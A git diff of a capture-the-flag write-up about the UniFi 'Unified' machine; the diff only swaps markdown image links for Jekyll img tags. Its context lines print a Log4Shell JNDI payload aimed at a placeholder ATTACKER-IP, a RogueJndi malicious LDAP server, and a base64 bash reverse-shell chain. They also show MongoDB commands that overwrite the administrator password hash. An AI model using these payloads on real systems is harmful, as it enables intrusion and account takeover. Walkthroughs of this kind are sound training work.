@@ -68,7 +68,7 @@ Nmap done: 1 IP address (1 host up) scanned in 211.42 seconds.
 
 We begin web enumeration. The service on port 8080 (Tomcat) redirects to port 8443, where we find the UniFi Network login page.
 
-![image.png](/assets/writeups/unified/image.png)
+<img src="{{ '/assets/writeups/unified/image.png' | relative_url }}">
 
 ---
 
@@ -86,7 +86,7 @@ The login page revealed:
 
 - **UniFi Network Version 6.4.54**
 
-![image.png](/assets/writeups/unified/image1.png)
+<img src="{{ '/assets/writeups/unified/image1.png' | relative_url }}">
 
 ---
 
@@ -145,7 +145,7 @@ Using **Burp Suite**, we intercepted the request to:
 /api/login
 ```
 
-![teste.png](/assets/writeups/unified/image-2.png)
+<img src="{{ '/assets/writeups/unified/image-2.png' | relative_url }}">
 
 The request body was JSON and contained a parameter named `remember`.
 
@@ -202,7 +202,7 @@ The attack flow:
 
 Even without RCE, an LDAP callback confirms the injection point.
 
-![write up unified(response burp).png](/assets/writeups/unified/write_up_unified(response_burp).png)
+<img src="{{ '/assets/writeups/unified/write_up_unified(response_burp).png' | relative_url }}">
 
 ---
 
@@ -214,7 +214,7 @@ We monitor LDAP traffic:
 sudo tcpdump -i tun0 port 389
 ```
 
-![image.png](/assets/writeups/unified/image-3.png)
+<img src="{{ '/assets/writeups/unified/image-3.png' | relative_url }}">
 
 This confirms:
 
@@ -238,7 +238,7 @@ Generated file:
 target/RogueJndi-1.1.jar
 ```
 
-![image.png](/assets/writeups/unified/image-4.png)
+<img src="{{ '/assets/writeups/unified/image-4.png' | relative_url }}">
 
 This acts as a malicious LDAP server.
 
@@ -264,7 +264,7 @@ Execution chain:
 bash -c {echo,BASE64}|{base64,-d}|{bash,-i}
 ```
 
-![image.png](/assets/writeups/unified/image-5.png)
+<img src="{{ '/assets/writeups/unified/image-5.png' | relative_url }}">
 
 ---
 
@@ -290,7 +290,7 @@ Trigger payload:
 ${jndi:ldap://ATTACKER-IP:1389/o=tomcat}
 ```
 
-![image.png](/assets/writeups/unified/image-7.png)
+<img src="{{ '/assets/writeups/unified/image-7.png' | relative_url }}">
 
 Reverse shell received.
 
@@ -308,7 +308,7 @@ User flag found in:
 /home/michael
 ```
 
-![image.png](/assets/writeups/unified/image-8.png)
+<img src="{{ '/assets/writeups/unified/image-8.png' | relative_url }}">
 
 ---
 
@@ -326,7 +326,7 @@ MongoDB running on:
 27117
 ```
 
-![image.png](/assets/writeups/unified/image-9.png)
+<img src="{{ '/assets/writeups/unified/image-9.png' | relative_url }}">
 
 ---
 
@@ -340,7 +340,7 @@ mongo --port 27117
 use ace
 ```
 
-![image.png](/assets/writeups/unified/image-10.png)
+<img src="{{ '/assets/writeups/unified/image-10.png' | relative_url }}">
 
 ---
 
@@ -354,7 +354,7 @@ mongo --port 27117 --quiet --eval 'db.admin.find().forEach(printjson)' ace > adm
 more admin_dump.txt
 ```
 
-![image.png](/assets/writeups/unified/image-11.png)
+<img src="{{ '/assets/writeups/unified/image-11.png' | relative_url }}">
 
 ---
 
@@ -391,8 +391,8 @@ Update database:
 mongo --port 27117 ace --quiet --eval 'db.admin.update({name:"administrator"},{$set:{x_shadow:"NEW_HASH"}})'
 ```
 
-![image.png](/assets/writeups/unified/image-12.png)
-![image.png](/assets/writeups/unified/image-13.png)
+<img src="{{ '/assets/writeups/unified/image-12.png' | relative_url }}">
+<img src="{{ '/assets/writeups/unified/image-13.png' | relative_url }}">
 
 ---
 
@@ -400,12 +400,12 @@ mongo --port 27117 ace --quiet --eval 'db.admin.update({name:"administrator"},{$
 
 Login successful:
 
-![image.png](/assets/writeups/unified/image-14.png)
-![image.png](/assets/writeups/unified/image-15.png)
+<img src="{{ '/assets/writeups/unified/image-14.png' | relative_url }}">
+<img src="{{ '/assets/writeups/unified/image-15.png' | relative_url }}">
 
 Root credentials found in settings:
 
-![image.png](/assets/writeups/unified/image-16.png)
+<img src="{{ '/assets/writeups/unified/image-16.png' | relative_url }}">
 
 ---
 
@@ -415,7 +415,7 @@ Root credentials found in settings:
 ssh root@10.129.1.13
 ```
 
-![image.png](/assets/writeups/unified/image-17.png)
+<img src="{{ '/assets/writeups/unified/image-17.png' | relative_url }}">
 
 ---
 
